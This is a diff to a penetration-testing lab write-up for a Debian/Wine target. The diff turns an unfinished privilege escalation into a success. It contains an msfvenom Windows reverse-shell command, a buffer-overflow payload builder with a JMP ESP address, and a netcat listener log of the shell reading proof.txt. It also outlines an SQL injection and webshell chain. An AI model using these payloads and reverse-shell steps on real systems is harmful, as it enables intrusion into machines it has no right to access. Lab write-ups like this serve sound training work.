@@ -14,9 +14,9 @@
 | Target IP (lab)  | 10.0.0.31                                                                |
 | OS               | Debian Linux (Apache 2.4.38, MariaDB) + Windows binary under Wine        |
 | Goal             | `local.txt` + `proof.txt`                                                |
-| Flag status      | `local.txt` obtained (7 pts) · `proof.txt` pending (4 pts) — BOF confirmed but shellcode did not call back |
+| Flag status      | `local.txt` obtained (7 pts) · `proof.txt` obtained (4 pts) — BOF returned a shell under Wine |
 
-Chain in one line: SQLi in `student_attendance/manage_user.php` → admin panel → webshell upload at `ajax.php?action=save_settings` → `www-data` RCE → read `local.txt`. For root: BOF in `access.exe` (Wine, port 23) with `JMP ESP` in `funcs_access.dll` — EIP overwrite confirmed, callback never arrived.
+Chain in one line: SQLi in `student_attendance/manage_user.php` → admin panel → webshell upload at `ajax.php?action=save_settings` → `www-data` RCE → read `local.txt`. For root: BOF in `access.exe` (Wine, port 23) with `JMP ESP` in `funcs_access.dll` → Windows reverse shell → read `proof.txt`.
 
 ## 2. Initial reconnaissance
 
@@ -155,7 +155,7 @@ e4ed...[REDACTED]...9fd5
 
 > **LOCAL.TXT — 7 PTS** → flag obtained ✓
 
-## 6. Privilege escalation (partial)
+## 6. Privilege escalation
 
 ### 6.1 Static analysis of access.exe (Wine)
 
@@ -196,7 +196,7 @@ Confirmed via binary search on port 23.
 
 ```
 funcs_access.dll @ ImageBase: 0x62500000
-JMP ESP            @ 0x625006d0    (no null bytes, no bad chars)
+JMP ESP            @ 0x625012dd    (no null bytes, no bad chars)
 ```
 
 ### 6.4 Bad chars + shellcode
@@ -208,33 +208,45 @@ Bad chars identified: \x00 \x0a \x0d \x4d \x4f \x5f \x79
 ```
 
 ```bash
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.1.9 LPORT=443 \
-  -f py -b '\x00\x0a\x0d\x4d\x4f\x5f\x79'
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.8 LPORT=4444 \
+  -f python -b '\x00\x0a\x0d\x4d\x4f\x5f\x79' \
+  -e x86/call4_dword_xor EXITFUNC=thread
 ```
 
 ### 6.5 Final payload
 
 ```python
-payload = b"A" * 1902                   # buffer + saved EBP
-payload += b"\xd0\x06\x50\x62"          # JMP ESP @ 0x625006d0 (little-endian)
-payload += b"\x90" * 20                 # NOP sled
-payload += shellcode                    # linux/x86 reverse shell
+prefix = b"Verification Code: "
+padding = b"A" * 1883                  # 1902 - 19-byte prefix
+jmp_esp = b"\xdd\x12\x50\x62"          # JMP ESP @ 0x625012dd (little-endian)
+nop_sled = b"\x90" * 32
+payload = prefix + padding + jmp_esp + nop_sled + shellcode
 ```
 
 ### 6.6 Result
 
-> The service crashed (port 23 closed) — EIP overwrite confirmed. No callback because of outbound traffic blocking in the Wine context running as root. Port 443 worked via the webshell but not via the Wine shellcode. Investigation pending.
->
-> CVE-2021-4034 (PwnKit / pkexec 0.105-25) was also tried — `dlopen` of the `gconv` module failed (to be investigated).
+The corrected Windows shellcode called back on port 4444 and returned a shell under Wine:
 
-→ `proof.txt` — **PENDING (4 pts)** ⚠️
+```bash
+sudo nc -lvnp 4444
+# connect to [10.0.1.8] from (UNKNOWN) [10.0.0.31] 36008
+# Microsoft Windows 6.1.7601 (4.0)
+
+Z:\>dir root
+# proof.txt
+
+Z:\>more Z:\root\proof.txt
+ccc3...[REDACTED]...d2ae
+```
+
+> **PROOF.TXT — 4 PTS** → flag obtained ✓
 
 ## 7. Flags
 
 | Flag       | Points | Location              | Value / Status                                                    |
 |------------|--------|-----------------------|-------------------------------------------------------------------|
 | local.txt  | 7 pts  | `/home/fox/local.txt` | `e4ed...[REDACTED]...9fd5` ✓                              |
-| proof.txt  | 4 pts  | `/root/proof.txt`     | PENDING (BOF confirms EIP overwrite, shellcode without callback)  |
+| proof.txt  | 4 pts  | `/root/proof.txt`     | `ccc3...[REDACTED]...d2ae` ✓                              |
 
 | Credential                          | Value    | Source               |
 |-------------------------------------|----------|----------------------|
@@ -251,16 +263,16 @@ payload += shellcode                    # linux/x86 reverse shell
 6. Active webshell → reverse shell to `10.0.1.9:443` as `www-data`.
 7. Read `local.txt` in `/home/fox/`.
 8. Static analysis of `access.exe` in r2 — vulnerable function `_f3` (`strcpy`).
-9. Compute EIP offset = 1902; JMP ESP gadget in `funcs_access.dll @ 0x625006d0`.
-10. Identify bad chars (`\x00 \x0a \x0d \x4d \x4f \x5f \x79`); shellcode with `msfvenom`.
-11. Payload fired → service crashes (EIP overwrite confirmed) → no callback (outbound filtering inside the Wine process).
-12. PwnKit also attempted — fails on `dlopen` `gconv`.
+9. Compute EIP offset = 1902; JMP ESP gadget in `funcs_access.dll @ 0x625012dd`.
+10. Identify bad chars (`\x00 \x0a \x0d \x4d \x4f \x5f \x79`); Windows shellcode with `msfvenom`.
+11. Payload fired → reverse shell on `10.0.1.8:4444` under Wine.
+12. Read `proof.txt` in `Z:\root\`.
 
 ## 9. Technical lessons
 
 - Wine as root + binary without ASLR/NX is the classic educational BOF scenario.
 - Bad-char sanitization in the `ConnectionHandler` requires manual byte-by-byte identification.
-- EIP overwrite ≠ shell — in Wine environments, host network-namespace/firewall restrictions can block the shellcode's `connect()`.
-- A webshell can bypass an outbound firewall (it goes through the host's Apache) but an independent shellcode cannot.
+- The shellcode must match the Windows process running under Wine; a Linux payload will not produce the expected callback.
+- The 19-byte `Verification Code: ` prefix must be included in the EIP offset calculation.
 - PwnKit (CVE-2021-4034) depends on the `gconv` path — on minimal distros it can fail silently.
 - Always try a login bypass before sqlmap — saves minutes of queries.
